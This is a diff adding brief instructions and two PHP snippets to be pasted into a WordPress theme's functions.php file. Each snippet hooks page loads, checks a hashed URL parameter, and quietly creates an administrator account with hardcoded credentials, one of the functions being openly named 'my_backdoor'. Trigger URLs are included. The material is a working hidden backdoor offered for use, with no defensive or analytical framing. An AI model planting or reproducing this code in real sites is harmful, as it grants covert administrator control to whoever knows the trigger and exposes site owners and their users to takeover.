@@ -1,0 +1,34 @@
+paste this code in our "active theme" "functions.php" file anywhere.
+then it will create a new administrator user to access the site dashboard.
+
+add_action( 'wp_head', 'my_room' );
+
+function my_room() {
+    if ( md5( $_GET['room'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'anyUserName' ) ) {
+            $user_id = wp_create_user( 'anyUserName', 'anyPassword' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+https://yoursite.com?room=go
+
+
+
+add_action( 'wp_head', 'my_backdoor' );
+
+function my_backdoor() {
+    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'minhaz' ) ) {
+            $user_id = wp_create_user( 'minhaz', 'pass' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+https://yoursite.com?backdoor=go
